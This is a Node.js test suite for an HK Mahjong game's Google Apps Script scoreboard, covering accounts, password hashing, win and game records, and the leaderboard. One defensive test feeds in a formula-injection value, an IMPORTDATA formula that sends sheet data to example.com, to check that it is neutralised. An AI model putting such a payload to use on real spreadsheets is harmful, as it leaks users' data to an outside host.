#!/usr/bin/env node
/* HK Mahjong — tests/scoreboard_gs.test.js
 * Runs server/scoreboard.gs (the Google Apps Script web app) in Node against small fakes of SpreadsheetApp,
 * PropertiesService, LockService, ContentService and Utilities, then drives it through the same JSON requests the
 * game sends (src/ui/online.js): set up the tabs, create accounts, sign in, record wins and games (with retries),
 * and read the leaderboard. Formulas are not evaluated here; they are checked for shape and row references.
 *   node tests/scoreboard_gs.test.js
 */
'use strict';
var crypto = require('crypto');
var passes = 0, fails = 0;
function ok(c, label) { if (c) passes++; else { fails++; console.log('FAIL ' + label); } }

var S = require('./_stubs/gas.js').makeServer();
var sandbox = S.sandbox, book = S.book, propsStore = S.props;

function call(body) { return JSON.parse(sandbox.doPost({ postData: { contents: JSON.stringify(body) } }).text); }
function getCall(params) { return JSON.parse(sandbox.doGet({ parameter: params }).text); }
function pw(name, pass) { return crypto.createHash('sha256').update('hkmj:' + name.toLowerCase() + ':' + pass, 'utf8').digest('hex'); }
function sheet(n) { return book.getSheetByName(n); }
function col(sh, c) { var out = []; for (var r = 2; r <= sh.getLastRow(); r++) out.push(sh.get(r, c)); return out; }

// ------------------------------------------------------------------ setup
ok(/ready/.test(sandbox.setup()), 'setup runs');
var names = book.getSheets().map(function (s) { return s.name; });
ok(JSON.stringify(names) === JSON.stringify(['Players', 'Games', 'Wins', 'Stats', 'Leaderboard', 'Hall of Fame']), 'tabs created, Sheet1 removed: ' + names.join(', '));
ok(sheet('Games').get(1, 4) === 'Final score' && sheet('Wins').get(1, 9) === 'Hand IDs', 'headers written');
ok(sheet('Stats').get(2, 12) === 'fullFlush' && sheet('Stats').get(1, 12) === 'Full Flush', 'Stats has hand names and scoring IDs');
ok(/^=IFERROR\(SORT\(FILTER\(Stats!A3:AN,/.test(sheet('Leaderboard').get(2, 2)), 'Leaderboard sorts the Stats rows');
ok(sandbox.setup() && book.getSheets().length === 6, 'setup is safe to run twice');
ok(getCall({ action: 'ping' }).ok === true, 'ping');

// ------------------------------------------------------------------ accounts
ok(call({ action: 'register', username: 'J', pw: pw('J', 'x') }).ok === false, 'name too short rejected');
ok(call({ action: 'register', username: '<b>x</b>', pw: pw('<b>x</b>', 'x') }).ok === false, 'odd characters rejected');
ok(call({ action: 'register', username: 'Julie', pw: 'nothex' }).ok === false, 'password must arrive hashed');
var r1 = call({ action: 'register', username: '  Julie  ', pw: pw('Julie', 'tea') });
ok(r1.ok && r1.username === 'Julie', 'register Julie');
ok(call({ action: 'register', username: 'julie', pw: pw('julie', 'other') }).ok === false, 'names are unique ignoring case');
ok(call({ action: 'register', username: '阿梅', pw: pw('阿梅', 'dim sum') }).ok === true, 'Chinese names allowed');
ok(call({ action: 'register', username: 'Bel', pw: pw('Bel', 'bel') }).ok === true, 'register Bel');
ok(call({ action: 'login', username: 'Julie', pw: pw('Julie', 'wrong') }).ok === false, 'wrong password rejected');
var li = call({ action: 'login', username: 'JULIE', pw: pw('JULIE', 'tea') });
ok(li.ok && li.username === 'Julie', 'login is case-insensitive and returns the registered spelling');
ok(JSON.stringify(Object.keys(propsStore).filter(function (k) { return k !== 'sheetId'; }).sort()) === JSON.stringify(['user:bel', 'user:julie', 'user:阿梅']), 'credentials only in Script Properties');
var stored = JSON.parse(propsStore['user:julie']);
ok(stored.hash !== pw('Julie', 'tea') && stored.salt && stored.hash.length === 64, 'server salts and re-hashes');
var sheetText = book.getSheets().map(function (s) { return JSON.stringify(s.cells); }).join('');
ok(sheetText.indexOf(stored.hash) < 0 && sheetText.indexOf(pw('Julie', 'tea')) < 0, 'no password hash anywhere in the sheet');
ok(JSON.stringify(col(sheet('Players'), 1)) === JSON.stringify(['Julie', '阿梅', 'Bel']), 'Players rows');
ok(col(sheet('Stats'), 1).slice(1).join() === 'Julie,阿梅,Bel', 'one Stats row per player (from row 3)');
ok(sheet('Stats').get(3, 2) === '=COUNTIF(Games!$B$2:$B,$A3)' && sheet('Stats').get(5, 12) === '=COUNTIFS(Wins!$B$2:$B,$A5,Wins!$I$2:$I,"*,"&L$2&",*")',
  'Stats formulas reference their own row: ' + sheet('Stats').get(5, 12));

// ------------------------------------------------------------------ records
var J = { username: 'Julie', pw: pw('Julie', 'tea') }, B = { username: 'Bel', pw: pw('Bel', 'bel') };
function win(who, extra) { return call(Object.assign({ action: 'win' }, who, extra)); }
ok(win({ username: 'Julie', pw: pw('Julie', 'nope') }, { gameId: 'g1', handNo: 1, fan: 7 }).ok === false, 'win with a bad password rejected');
ok(win(J, { gameId: 'g1', handNo: 1, fan: 8, points: 64, source: 'self', items: [{ id: 'fullFlush', name: 'Full Flush', fan: 7 }, { id: 'selfPick', name: 'Self-Pick', fan: 1 }] }).ok, 'record a win');
ok(win(J, { gameId: 'g1', handNo: 1, fan: 8, points: 64, source: 'self', items: [] }).duplicate === true, 'same win sent twice is stored once');
ok(win(J, { gameId: 'g1', handNo: 4, fan: 13, points: 256, source: 'discard', items: [{ id: 'thirteenOrphans', name: 'Thirteen Orphans', fan: 13 }] }).ok, 'record a limit hand');
ok(win(B, { gameId: 'g9', handNo: 2, fan: 0, points: 4, source: 'discard', chicken: true, items: [] }).ok, 'record a chicken hand');
ok(win(B, { gameId: 'g9', handNo: 3, fan: 7, points: 48, source: 'self', items: [{ id: 'fullFlush', name: 'Full Flush', fan: 7 }] }).ok, 'Bel full flush');
ok(win(B, { gameId: 'g9', handNo: 5, fan: 7, points: 48, source: 'discard', items: [{ id: 'fullFlush', name: 'Full Flush', fan: 7 }] }).ok, 'Bel second full flush');
var W = sheet('Wins');
ok(W.getLastRow() === 6, 'five win rows (+ header): ' + W.getLastRow());
ok(W.get(2, 7) === 'Self-pick' && W.get(2, 9) === ',fullFlush,selfPick,' && W.get(3, 10) === 'Yes' && W.get(4, 11) === 'Yes' && W.get(4, 9) === ',chicken,',
  'win columns: how, hand IDs, limit, chicken');
ok(W.get(2, 8) === 'Full Flush 7, Self-Pick 1', 'scoring text');
function game(who, extra) { return call(Object.assign({ action: 'game' }, who, extra)); }
ok(game(J, { gameId: 'g1', score: 410, place: 1, hands: 9, handsWon: 2, selfPicks: 1, biggestFan: 13, minFan: 3, rounds: 4, aiLevel: 'normal' }).ok, 'record a game');
ok(game(J, { gameId: 'g1', score: 410, place: 1 }).duplicate === true, 'same game sent twice is stored once');
ok(game(B, { gameId: 'g9', score: -120, place: 3, hands: 7, handsWon: 3 }).ok, 'Bel game');
ok(game(B, { gameId: 'g10', score: 90, place: 2, hands: 6, handsWon: 0 }).ok, 'Bel second game');
ok(game(J, { gameId: 'g2', score: 1e12, place: 9 }).ok && sheet('Games').get(5, 4) === 1000000 && sheet('Games').get(5, 5) === 4, 'numbers are clamped');

// ------------------------------------------------------------------ leaderboard
var lb = getCall({ action: 'leaderboard', player: 'bel' });
ok(lb.ok, 'leaderboard ok');
var top = lb.players[0];
ok(top.name === 'Julie' && top.games === 2 && top.firsts === 1 && top.totalScore === 1000410 && top.handsWon === 2 && top.biggestFan === 13 && top.limitHands === 1,
  'Julie stats: ' + JSON.stringify(top));
var bel = lb.players.filter(function (p) { return p.name === 'Bel'; })[0];
ok(bel.games === 2 && bel.totalScore === -30 && bel.bestGame === 90 && bel.avgScore === -15 && bel.hands.fullFlush === 2 && bel.chickens === 1 && bel.selfPicks === 1,
  'Bel stats: ' + JSON.stringify(bel));
var mei = lb.players.filter(function (p) { return p.name === '阿梅'; })[0];
ok(mei && mei.games === 0 && mei.bestGame === 0 && mei.winRate === 0, 'a player with no games yet still listed');
ok(lb.players.map(function (p) { return p.rank; }).join() === '1,2,3', 'ranks');
var rec = {}; lb.records.forEach(function (r) { rec[r.award] = r; });
ok(rec['Biggest hand'].player === 'Julie' && rec['Biggest hand'].value === 13 && /Thirteen Orphans/.test(rec['Biggest hand'].detail), 'Hall of Fame: biggest hand');
ok(rec['Chicken champion'].player === 'Bel', 'Hall of Fame: chicken champion');
var champ = {}; lb.champions.forEach(function (c) { champ[c.id] = c; });
ok(champ.fullFlush.player === 'Bel' && champ.fullFlush.count === 2 && champ.fullFlush.first === 'Julie', 'Full Flush: champion Bel, first Julie');
ok(champ.thirteenOrphans.first === 'Julie' && !champ.nineGates, 'only hands someone has won are listed');
ok(lb.recent.length === 5 && lb.recent[0].player === 'Bel', 'recent wins, newest first');
ok(lb.myGames.length === 2 && lb.myGames[0].score === 90 && lb.myWins.length === 3, 'my games / wins for the asking player');
ok(Array.isArray(lb.hands) && lb.hands.length === 29, 'hand list sent with names');

// ------------------------------------------------------------------ formulas: balanced and pointing at real tabs
var bad = [];
book.getSheets().forEach(function (s) {
  Object.keys(s.cells).forEach(function (k) {
    var v = s.cells[k];
    if (typeof v !== 'string' || v[0] !== '=') return;
    var depth = 0, q = false;
    for (var i = 0; i < v.length; i++) { var ch = v[i]; if (ch === '"') q = !q; else if (!q && ch === '(') depth++; else if (!q && ch === ')') depth--; if (depth < 0) break; }
    var refs = (v.match(/([A-Za-z ]+)!/g) || []).map(function (x) { return x.replace(/^[^A-Za-z]*/, '').slice(0, -1).trim(); });
    var unknown = refs.filter(function (n) { return !book.getSheetByName(n); });
    if (depth !== 0 || q || unknown.length) bad.push(s.name + '!' + k + ' ' + v + (unknown.length ? ' unknown tabs ' + unknown : ''));
  });
});
ok(bad.length === 0, 'formulas balanced and reference existing tabs' + (bad.length ? ': ' + bad.slice(0, 3).join(' | ') : ''));
var hall = sheet('Hall of Fame');
ok(hall.get(1, 1) === 'Record' && hall.get(11, 1) === 'Hand' && hall.get(12, 2) === 'fullFlush' && /MATCH\("\*,"&\$B12&",\*",Wins!\$I\$2:\$I,0\)/.test(hall.get(12, 5)),
  'Hall of Fame hand rows find the first winner by scoring ID');
ok(/Stats!AN3:AN/.test(hall.get(9, 2)), 'chicken champion uses the Chicken Hand column (AN)');

// password reset keeps the records
ok(/reset/i.test(sandbox.resetPassword('bel')) && !propsStore['user:bel'], 'reset password');
ok(call({ action: 'register', username: 'Bel', pw: pw('Bel', 'new') }).ok, 'Bel registers again after a reset');
ok(getCall({ action: 'leaderboard' }).players.filter(function (p) { return p.name === 'Bel'; })[0].hands.fullFlush === 2, 'records kept after a reset');
ok(col(sheet('Players'), 1).filter(function (n) { return n === 'Bel'; }).length === 1, 'no duplicate Players row after a reset');
sandbox.resetPassword('Bel');
var again = call({ action: 'register', username: 'bEL', pw: pw('bEL', 'third') });
ok(again.ok && again.username === 'Bel' && col(sheet('Players'), 1).filter(function (n) { return /^bel$/i.test(n); }).length === 1,
  'coming back after a reset keeps the name as it is on the sheet');
ok(call({ action: 'login', username: 'bel', pw: pw('bel', 'third') }).ok, 'and the new password works');
// text from the game can't turn into a formula on the sheet
ok(call({ action: 'win', username: 'Julie', pw: pw('Julie', 'tea'), gameId: '=1+1', handNo: 9, fan: 3, points: 16,
  items: [{ id: 'x', name: '=IMPORTDATA("https://example.com/?"&Players!A2)', fan: 3 }] }).ok, 'win with formula-looking text accepted');
var wl = sheet('Wins'), wr = wl.getLastRow();
ok(String(wl.get(wr, 3)).charAt(0) !== '=' && String(wl.get(wr, 8)).charAt(0) !== '=' && /^IMPORTDATA/.test(wl.get(wr, 8)),
  'leading = removed from game ID and scoring text');
// web-app runs without an "active" spreadsheet fall back to the ID that setup() saved
ok(propsStore.sheetId === '1TestSheetId', 'setup remembers the sheet ID');
S.opts.noActive = true; sandbox.bookCache = null;
ok(getCall({ action: 'leaderboard' }).players.length > 0, 'works without an active spreadsheet (opens the saved ID)');
var savedId = propsStore.sheetId; delete propsStore.sheetId; sandbox.bookCache = null;
var noSetup = getCall({ action: 'leaderboard' });
ok(noSetup.ok === false && /run "setup"/.test(noSetup.error), 'clear message if setup was never run: ' + noSetup.error);
propsStore.sheetId = savedId; S.opts.noActive = false; sandbox.bookCache = null;
ok(call({ action: 'nope' }).ok === false && JSON.parse(sandbox.doPost({ postData: { contents: 'not json' } }).text).ok === false, 'bad requests answered with ok:false');

console.log('scoreboard_gs.test: ' + passes + ' passed, ' + fails + ' failed.');
process.exit(fails ? 1 : 0);
